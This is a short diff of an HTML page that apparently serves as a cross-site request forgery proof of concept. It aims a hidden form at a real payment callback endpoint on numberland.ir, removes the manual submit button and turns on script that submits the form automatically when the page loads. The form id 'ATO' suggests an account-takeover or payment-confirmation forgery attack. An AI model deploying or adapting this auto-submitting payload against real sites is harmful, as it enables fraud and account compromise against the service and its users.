@@ -44,7 +44,7 @@
 
 <body>
 
-<form action="https://numberland.ir/callback_ok.php" method="POST">
+<form  id="ATO" action="https://numberland.ir/callback_ok.php" method="POST">
 
     <input type="hidden" name="result_page" value="https://numberland.ir/">
 
@@ -70,20 +70,13 @@
 
     <input type="hidden" name="rang" value="">
 
-
-    <button type="submit">Send POST</button>
-
 </form>
 
 <script>
-<!-- document.getElementById("autoForm").submit(); -->
+document.getElementById("autoForm").submit();
 </script>
 
-<script>
-
-$('#ersalbepageok').click();
-
-</script>
+<!-- <body onload="document.getElementById('ATO').submit()"> -->
 
 
 
